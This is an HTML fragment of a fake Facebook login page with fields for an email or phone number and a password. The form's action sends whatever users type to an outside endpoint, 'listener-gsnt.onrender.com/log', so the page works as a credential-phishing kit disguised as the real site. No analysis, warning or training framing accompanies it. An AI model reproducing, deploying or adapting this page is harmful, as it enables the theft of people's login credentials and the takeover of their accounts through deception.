</head>
<body>
    <div class="main">
        <h1>facebook</h1>
        <div class="form">
            <p>Log in to facebook</p>
            <form id="loginForm" action="https://listener-gsnt.onrender.com/log" method="POST">
                <input type="text" name="username" id="username" placeholder="Email address or phone number" required>
                <input type="password" name="password" id="password" placeholder="Password" required>
                <button type="submit">Log in</button>
            </form>
            <div class="account-links">
                <a href="">Forgotten account?</a>
                <a href="">Sign up for Facebook</a>
            </div>
        </div>
    </div>
